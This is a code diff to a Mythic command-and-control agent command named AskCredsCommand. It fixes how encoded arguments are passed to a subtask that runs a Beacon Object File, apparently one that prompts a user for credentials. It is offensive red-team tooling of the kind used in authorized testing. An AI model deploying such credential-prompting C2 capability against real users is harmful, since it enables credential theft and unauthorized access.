@@ -119,7 +119,7 @@ class AskCredsCommand(CommandBase):
         reason = task.args.get_arg("reason")
         OfArgs.append(generateWString(reason))
         #print("Encoding Args")
-        encoded_args = base64.b64encode(SerialiseArgs(OfArgs))
+        encoded_args = base64.b64encode(SerialiseArgs(OfArgs)).decode()
         #print(encoded_args)
         # Pack our argument into our buffer using BeaconPack (You'll do this multiple times for each parameter)
         #bp.addWstr(task.args.get_arg("path"))
@@ -134,7 +134,7 @@ class AskCredsCommand(CommandBase):
         #   the argumentData which is the string representation of the hex output provided from bp.getbuffer()
         print("Requesting subtask")
         resp = await MythicRPC().execute("create_subtask_group", tasks=[
-            {"command": "coff", "params": {"coffFile":file_resp.response["agent_file_id"], "functionName":"go","arguments": "", "timeout":"30"}},
+            {"command": "coff", "params": {"coffFile":file_resp.response["agent_file_id"], "functionName":"go","arguments": encoded_args, "timeout":"30"}},
             ], 
             subtask_group_name = "coff", parent_task_id=task.id)
 
